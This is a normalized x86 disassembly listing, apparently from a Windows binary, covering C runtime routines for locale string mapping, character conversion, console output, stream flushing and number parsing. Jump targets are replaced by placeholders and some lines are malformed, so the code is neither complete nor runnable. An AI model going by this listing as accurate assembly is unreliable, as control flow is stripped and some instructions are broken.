call [ GetStringTypeA@IAT ]
mov edi eax
cmp esi ebx
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_424fb1
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_415093
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_415f60
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_4206ba
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_415170
pop ecx
cmp eax ebx
je r-xdata
call sub_4227d0
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_422290
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_41c653
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_4220d6
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4222e0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_422320
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
push edi
mov esi ecx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_424f66
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_414a33
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_424fb1
add esp 0x18
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_415093
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_415093
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_4206ba
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx ebx
je r-xdata
push eax
call sub_415170
pop ecx
cmp eax ebx
je r-xdata
call sub_4227d0
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_415f60
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_424fb1
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_415170
pop ecx
cmp eax ebx
je r-xdata
call sub_4227d0
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_4206ba
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_4206ba
pop ecx
push ebx
push ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
push eax
call sub_415170
pop ecx
cmp eax ebx
je r-xdata
call sub_4227d0
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_4226c5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_41c653
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_422320
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_42270a
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_41c653
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_4215e9
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_422290
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_4227fc
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_4162ac
mov [ eax ] 0x9
call sub_4162bf
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_422882
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_4162bf
and [ eax ] 0x0
call sub_4162ac
mov [ eax ] 0x9
or eax 0xffffffff
pop ebp
retn
call sub_4162bf
mov [ eax ] esi
call sub_4162ac
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_4153b1
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax [ rw-data ]
jae r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
sub_4228f9
push 0xc
push r--data
call sub_415ff4
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_419057
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_416039
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_422990
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_41ed13
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_422999
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_4229c0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_425165
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_414a33
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
sub_422a85
push 0x10
push r--data
call sub_415ff4
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_419057
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_422b1b
mov eax [ ebp - 0x1c ]
call sub_416039
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_425228
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_415093
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_422b24
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_4212e9
pop ecx
push eax
call sub_420fab
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_422b8c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_422b24
pop ecx
test eax eax
je r-xdata
push esi
call sub_422bd4
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_4212e9
push eax
call sub_4252a4
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_422bd4
push 0x14
push r--data
call sub_415ff4
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_419057
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_422ca5
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_416039
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_42124c
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_422c76
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_422b8c
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_422b8c
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_422cb7
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_4212e9
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_4162ac
mov [ eax ] 0x9
test al 0x1
je r-xdata
call sub_4162ac
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push 0x2
and eax 0xffffffef
pop ebx
or eax ebx
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_421134
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
mov edi ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] bx
call sub_420fab
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x2 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
sub ecx ebx
mov [ esi + 0x4 ] ecx
test edi edi
jle r-xdata
push [ ebp + 0xc ]
call sub_4210d0
pop ecx
test eax eax
jne r-xdata
call sub_421134
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
mov eax ebx
and eax 0xffff
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_420fab
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_421087
pop ecx
pop edi
pop ebx
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] bx
jmp r-xdata
push ebx
push 0x0
push 0x0
push ecx
call sub_42075f
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_422e2b
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_41c653
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_4162ac
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_4153b1
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_42270a
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
mov eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_4162ac
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_42305a
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_422e2b
add esp 0x14
pop ebp
retn
sub_423085
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
